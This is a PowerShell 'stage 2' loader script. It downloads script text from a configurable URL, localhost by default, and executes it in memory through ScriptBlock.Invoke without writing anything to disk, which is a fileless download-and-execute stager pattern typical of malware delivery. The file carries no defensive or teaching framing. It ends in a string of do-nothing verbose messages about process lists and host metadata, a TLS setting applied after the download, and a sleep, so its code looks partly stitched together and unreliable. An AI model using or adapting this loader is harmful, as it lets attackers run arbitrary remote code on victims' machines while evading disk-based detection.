
<#
.SYNOPSIS
    Endpoint-driven in-memory script loader.

.DESCRIPTION
    Resolves the configured endpoint, downloads the stage 2 text
    with a bounded timeout, checks the returned length and then
    executes the script block in the current session.

.NOTES
    No script content is written to disk.
#>
[CmdletBinding()]
param(
    [string]$DownloadUrl = "http://localhost:8080/stage2.ps1",
    [string]$TracePath = "$env:TEMP\stage.log",
    [int]$ConnectionTimeout = 10
)
$ErrorActionPreference = "Stop"

# Text retrieval
function Get-StageScriptText {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [int]$TimeoutSec = 10
    )

    Write-Verbose ("Fetching script text from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadString($SourceUrl)
}

# In-memory execution
function Invoke-Stage2Script {
    [CmdletBinding()]
    param(
        [string]$ScriptBody = ""
    )

    if ([string]::IsNullOrWhiteSpace($ScriptBody)) {
        throw "Stage 2 script body is empty"
    }
    Write-Verbose ("Script length: " + $ScriptBody.Length)
    $ScriptBlock = [ScriptBlock]::Create($ScriptBody)
    return $ScriptBlock.Invoke()
}

try {
    Write-Verbose "Starting in-memory stage"
    $StageScript = Get-StageScriptText -SourceUrl $DownloadUrl -TimeoutSec $ConnectionTimeout
    $StageResult = Invoke-Stage2Script -ScriptBody $StageScript
    Write-Verbose "Stage result: $($StageResult)"
}
catch {
    Write-Warning "In-memory loader failed: $($_.Exception.Message)"
}

$LoadReport = [ordered]@{
    Stage = "memory"
    Endpoint = $DownloadUrl
    ScriptLength = $StageScript.Length
}
$LoadReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Inspecting process list"
Write-Verbose "Collecting host metadata"
Write-Verbose "Starting workflow"
Write-Verbose "Retry budget remaining"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Resolving configured target"
Write-Verbose "Operation completed"
Write-Verbose "Stage handoff finished"
Write-Verbose "Applying operation timeout"
Write-Verbose "Preparing working directory"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Start-Sleep -Seconds 30
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
